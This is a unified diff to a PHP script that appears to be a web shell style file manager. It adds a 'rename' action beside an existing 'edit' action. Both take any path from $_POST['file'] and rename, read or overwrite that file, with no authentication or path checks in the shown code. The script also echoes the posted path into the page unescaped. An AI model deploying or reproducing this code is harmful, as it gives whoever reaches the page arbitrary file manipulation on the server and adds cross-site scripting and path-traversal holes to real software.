@@ -205,6 +205,67 @@
           }
         }
         switch (@$_POST['action']) {
+          case 'rename':
+          if (isset($_POST['submit'])) {
+            if (rename($_POST['file'] , $_POST['newname'])) {
+              ?>
+              <tr>
+                <td>
+                  rename success
+                </td>
+              </tr>
+              <?php
+            } else {
+              ?>
+              <tr>
+                <td>
+                  rename failed
+                </td>
+              </tr>
+              <?php
+            }
+          }
+          switch ($_POST['file']) {
+            case filetype($_POST['file']) == 'dir' :
+              ?>
+                <tr>
+                  <td>
+                    Filename : <?= basename($_POST['file']) ?>
+                  </td>
+                </tr>
+                <tr>
+                  <td>
+                    <form method="post">
+                      <select class="form-control" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
+                        <option value="back">back</option>
+                        <option value="rename" selected>rename</option>
+                      </select>
+                    </form>
+                  </td>
+                </tr>
+                <tr>
+                  <form method="post">
+                  <td>
+                    <input class="form-control" type="text" name="newname" value="<?= basename($_POST['file']) ?>">
+                  </td>
+                </tr>
+                <tr>
+                  <td>
+                    <input type="submit" name="submit" class="btn btn-secondary" style="width:100%;">
+                  </td>
+                </tr>
+                <input type="hidden" name="action" value="rename">
+                <input type="hidden" name="file" value="<?= $_POST['file'] ?>">
+              </form>
+              <?php
+              exit();
+              break;
+            
+            default:
+              # code...
+              break;
+          }
+          break;
           case 'edit':
             if (isset($_POST['submit'])) {
               $handle = fopen($_POST['file'] , 'w');
@@ -227,7 +288,6 @@
               } 
             } $file = htmlspecialchars(file_get_contents($_POST['file']));
             ?>
-              <form method="post">
                 <tr>
                   <td>
                     Filename : <?= basename($_POST['file']) ?>
@@ -240,11 +300,11 @@
                         <option value="back">back</option>
                         <option value="edit" selected>edit</option>
                       </select>
-                      <input type="hidden" name="file" value="<?= getcwd().'/'.$files ?>">
                     </form>
                   </td>
                 </tr>
                 <tr>
+                  <form method="post">
                   <td>
                     <textarea class="form-control" style="height:350px;" name="text"><?= $file ?></textarea>
                   </td>
@@ -361,6 +421,7 @@
                     <form method="post">
                       <select class="form-control" name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
                         <option selected>choose . .</option>
+                        <option value="rename">rename</option>
                       </select>
                       <input type="hidden" name="file" value="<?= cwd().'/'.$files ?>">
                     </form>
